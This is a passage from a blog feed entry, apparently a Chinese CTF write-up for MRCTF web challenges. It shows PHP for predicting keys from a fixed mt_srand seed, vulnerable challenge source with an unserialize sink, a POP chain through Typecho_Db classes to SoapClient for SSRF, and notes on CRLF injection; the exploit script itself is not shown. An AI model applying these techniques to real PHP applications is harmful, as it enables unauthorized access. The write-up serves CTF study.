php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">mt_srand(<span class="number">1775196155</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span><span class="params">($length = <span class="number">16</span>)</span> </span>&#123;</span><br><span class="line">    $strings1 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $public_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">        $public_key .= substr($strings1, mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $public_key;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">private_key</span><span class="params">($length = <span class="number">12</span>)</span> </span>&#123;</span><br><span class="line">    $strings2 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $private_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">        $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $private_key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> public_key();  <span class="comment">//KVQP0LdJKRaV3n9D</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> private_key();  <span class="comment">//XuNhoueCDCGceth0</span></span><br></pre></td></tr></table></figure><p>在login.html使用万能账号登陆</p><p><img src="/pic/146.png" alt=""></p><h2 id="Ezpop-Revenge"><a href="#Ezpop-Revenge" class="headerlink" title="Ezpop_Revenge"></a>Ezpop_Revenge</h2><p>扫描目录有源码<a href="http://www.zip" target="_blank" rel="noopener">www.zip</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION)) session_start();</span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>]===<span class="string">"127.0.0.1"</span>)&#123;</span><br><span class="line">   $_SESSION[<span class="string">'flag'</span>]= <span class="string">"MRCTF&#123;******&#125;"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">"我扌your problem?\nonly localhost can get flag!"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现是要ssrf</p><p>查看了几个页面后发现Plugin.php中可疑,以下是关键代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Plugin.php</span></span><br><span class="line">...</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld_DB</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $flag=<span class="string">"MRCTF&#123;this_is_a_fake_flag&#125;"</span>;</span><br><span class="line">    <span class="keyword">private</span> $coincidence;</span><br><span class="line">    <span class="function"><span class="keyword">function</span>  <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $db = <span class="keyword">new</span> Typecho_Db(<span class="keyword">$this</span>-&gt;coincidence[<span class="string">'hello'</span>], <span class="keyword">$this</span>-&gt;coincidence[<span class="string">'world'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld_Plugin</span> <span class="keyword">implements</span> <span class="title">Typecho_Plugin_Interface</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION)) session_start();</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'admin'</span>])) var_dump($_SESSION);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'C0incid3nc3'</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/file|assert|eval|[`\'~^?&lt;&gt;$%]+/i"</span>,base64_decode($_POST[<span class="string">'C0incid3nc3'</span>])) === <span class="number">0</span>)</span><br><span class="line">unserialize(base64_decode($_POST[<span class="string">'C0incid3nc3'</span>]));</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Not that easy."</span>;</span><br><span class="line">&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>HelloWorld_Plugin类中如果传入了admin，就打印出session，是反序列化。HelloWorld_DB类中__wakeup函数创建了一个Typecho_Db类，跟进查看</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Db</span></span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($adapterName, $prefix = <span class="string">'typecho_'</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">/** 获取适配器名称 */</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_adapterName = $adapterName;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** 数据库适配器 */</span></span><br><span class="line">        $adapterName = <span class="string">'Typecho_Db_Adapter_'</span> . $adapterName;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!call_user_func(<span class="keyword">array</span>($adapterName, <span class="string">'isAvailable'</span>))) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Typecho_Db_Exception(<span class="string">"Adapter &#123;$adapterName&#125; is not available"</span>);<span class="comment">//__toString()</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_prefix = $prefix;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** 初始化内部变量 */</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_pool = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_connectedPool = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_config = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//实例化适配器对象</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_adapter = <span class="keyword">new</span> $adapterName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造函数这里是字符串拼接，还给了提示，__toString()，搜索__toString()，在Query函数中找到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Db_Query</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> KEYWORDS = <span class="string">'*PRIMARY|AND|OR|LIKE|BINARY|BY|DISTINCT|AS|IN|IS|NULL'</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> $_default = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">'action'</span> =&gt; <span class="keyword">NULL</span>,</span><br><span class="line">        <span class="string">'table'</span>  =&gt; <span class="keyword">NULL</span>,</span><br><span class="line">        <span class="string">'fields'</span> =&gt; <span class="string">'*'</span>,</span><br><span class="line">        <span class="string">'join'</span>   =&gt; <span class="keyword">array</span>(),</span><br><span class="line">        <span class="string">'where'</span>  =&gt; <span class="keyword">NULL</span>,</span><br><span class="line">        <span class="string">'limit'</span>  =&gt; <span class="keyword">NULL</span>,</span><br><span class="line">        <span class="string">'offset'</span> =&gt; <span class="keyword">NULL</span>,</span><br><span class="line">        <span class="string">'order'</span>  =&gt; <span class="keyword">NULL</span>,</span><br><span class="line">        <span class="string">'group'</span>  =&gt; <span class="keyword">NULL</span>,</span><br><span class="line">        <span class="string">'having'</span>  =&gt; <span class="keyword">NULL</span>,</span><br><span class="line">        <span class="string">'rows'</span>   =&gt; <span class="keyword">array</span>(),</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">private</span> $_adapter;</span><br><span class="line">    <span class="keyword">private</span> $_sqlPreBuild;</span><br><span class="line">    <span class="keyword">private</span> $_prefix;</span><br><span class="line">    <span class="keyword">private</span> $_params = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'action'</span>]) &#123;</span><br><span class="line">            <span class="keyword">case</span> Typecho_Db::SELECT:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_adapter-&gt;parseSelect(<span class="keyword">$this</span>-&gt;_sqlPreBuild);</span><br><span class="line">            <span class="keyword">case</span> Typecho_Db::INSERT:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'INSERT INTO '</span></span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'table'</span>]</span><br><span class="line">                . <span class="string">'('</span> . implode(<span class="string">' , '</span>, array_keys(<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'rows'</span>])) . <span class="string">')'</span></span><br><span class="line">                . <span class="string">' VALUES '</span></span><br><span class="line">                . <span class="string">'('</span> . implode(<span class="string">' , '</span>, array_values(<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'rows'</span>])) . <span class="string">')'</span></span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'limit'</span>];</span><br><span class="line">            <span class="keyword">case</span> Typecho_Db::DELETE:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'DELETE FROM '</span></span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'table'</span>]</span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'where'</span>];</span><br><span class="line">            <span class="keyword">case</span> Typecho_Db::UPDATE:</span><br><span class="line">                $columns = <span class="keyword">array</span>();</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'rows'</span>])) &#123;</span><br><span class="line">                    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'rows'</span>] <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">                        $columns[] = <span class="string">"$key = $val"</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> <span class="string">'UPDATE '</span></span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'table'</span>]</span><br><span class="line">                . <span class="string">' SET '</span> . implode(<span class="string">' , '</span>, $columns)</span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'where'</span>];</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>找到这里就发现select处可以构造soapclient，进行ssrf。</p><p>整理一下pop链</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HelloWorld_DB::__wakeup()-&gt;Typecho_Db::__construct()-&gt;Typecho_Db_Query::__toString()-&gt;SoapClient::-&gt;__call()</span><br></pre></td></tr></table></figure><p>有了pop链了，开始写脚本，在写脚本的过程中发现</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>soap类无法传入session，但是使用CRLF注入</p><blockquote><p>CRLF是”回车 + 换行”（\r\n）的简称。在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLF Injection又叫HTTP Response Splitting，简称HRS。</p><p>[参考链接](<a href="https://wooyun.js.org/drops/CRLF" target="_blank" rel="noopener">https://wooyun.js.org/drops/CRLF</a> Injection漏洞的利用与实例分析.html)</p></blockquote><p>在user-agengt处使用\r\n进行换行</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;headerlink&quot; title=&quot;web&quot;&gt;&lt;/a&gt;web&lt;/h1&gt;&lt;h2 id=&quot;ez-bypass&quot;&gt;&lt;a href=&quot;#ez-bypass&quot; class=&quot;headerlink&quot; title=&quot;ez_bypass&quot;&gt;&lt;/a&gt;ez_bypass&lt;/h2&gt;&lt;p&gt;打开题目就有源码&lt;/p&gt;
    
    </summary>
    
    
      <category term="刷题" scheme="https://sunny250.github.io/categories/%E5%88%B7%E9%A2%98/"/>
    
    
      <category term="wp" scheme="https://sunny250.github.io/tags/wp/"/>
    
      <category term="ctf" scheme="https://sunny250.github.io/tags/ctf/"/>
    
      <category term="待完成" scheme="https://sunny250.github.io/tags/%E5%BE%85%E5%AE%8C%E6%88%90/"/>
    
  </entry>
  
</feed>
